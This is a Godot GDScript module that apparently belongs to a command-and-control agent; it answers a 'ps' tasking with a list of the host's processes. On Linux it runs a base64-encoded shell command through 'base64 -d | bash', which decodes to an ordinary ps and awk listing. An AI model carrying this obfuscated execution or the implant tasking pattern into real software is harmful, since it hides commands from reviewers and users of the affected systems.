extends Node

var api

func _ready():
	api = $".".get_parent().get_node("api")


func _on_tasking_ps(task):

	if task.has("command") and task.get("command") == "ps":
		var output = "not implemented xD"
		var status = "error"
		var processes = []
		
		if OS.has_feature("X11"):
			processes = get_linux_ps()
			
		if OS.has_feature("Windows"):
			processes = get_windows_ps()

		if OS.has_feature("OSX"):
			processes = get_osx_ps()

		if OS.has_feature("iOS"):
			processes = get_ios_ps()

		if OS.has_feature("Android"):
			processes = get_android_ps()

		if processes.size() > 0:
			status = "successs"

		api.agent_response(
			api.create_task_response(
				true,
				true,
				task.get("id"),
				output,
				[],
				[],
				[{
					"processes": processes,
					"task_id": task.get("id"),
					"status": status,
					"completed": true,
				}]
			)
		)

func get_linux_ps():
	var output = []

	var exit_code = OS.execute("bash", ["-c", 'echo "cHMgaCAtLXNvcnQ9dWlkLHBpZCxwcGlkIC0td2lkdGggMTAwMDAgLWUgLW8gcGlkIC1vICUlIC1vIGNvbW0gLW8gJSUgLW8gdXNlciAtbyAlJSAtbyBleGUgLW8gJSUgLW8gcHBpZCAtbyAlJSAtbyBhcmdzIC1vICUlIC1vIHN0YXJ0X3RpbWUgfCBhd2sgLUYgIiUiICdCRUdJTntwcmludCJbIn0gL0JFR0lOLyAge25leHR9IHtnc3ViKCIgKyIsIiIpOyBnc3ViKCJcIiIsICIiKTsgcHJpbnRmKHQie1wicHJvY2Vzc19pZFwiOiBcIiVzXCIsIFwibmFtZVwiOiBcIiVzXCIsIFwidXNlclwiOiBcIiVzXCIsIFwiYmluX3BhdGhcIjogXCIlc1wiLCBcInBhcmVudF9wcm9jZXNzX2lkXCI6IFwiJXNcIiwgXCJjb21tYW5kX2xpbmVcIjogXCIlc1wiLCBcInRpbWVcIjogXCIlc1wifVxuIiwgJDEsICQyLCAkMywgJDQsICQ1LCAkNiwgJDcpfSB7dD0iLCAifSBFTkQge3ByaW50ICJdIn0n" |base64 -d | bash'], true, output, true)

	print(exit_code)

	return parse_json(output[0])

func get_windows_ps():
	return []

func get_osx_ps():
	return []

func get_ios_ps():
	return []

func get_android_ps():
	return []
